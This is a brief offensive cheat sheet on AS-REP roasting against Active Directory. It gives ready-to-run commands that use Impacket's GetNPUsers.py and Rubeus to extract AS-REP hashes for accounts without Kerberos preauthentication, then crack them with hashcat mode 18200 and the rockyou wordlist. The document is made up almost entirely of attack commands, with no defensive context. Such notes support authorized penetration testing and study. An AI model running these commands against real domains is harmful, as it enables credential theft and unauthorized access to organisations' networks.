# Active Directory AS-REP Roasting

*Requirements :*   
Valid usernames list


# Retrieve TGT 
## Using Impacket
```bash
# On the local machine
GetNPUsers.py <TARGET DOMAIN>/ -dc-ip <DC IP>  -usersfile <USERLIST> -no-pass
```

## Using Rubeus
```cmd
:: Directly from the target machine
Rubeus.exe asreproast 
```

## Crack TGTs \ hashcat

```bash
hashcat -a 0 -m 18200 <HASH FILE> /usr/share/wordlists/rockyou.txt
```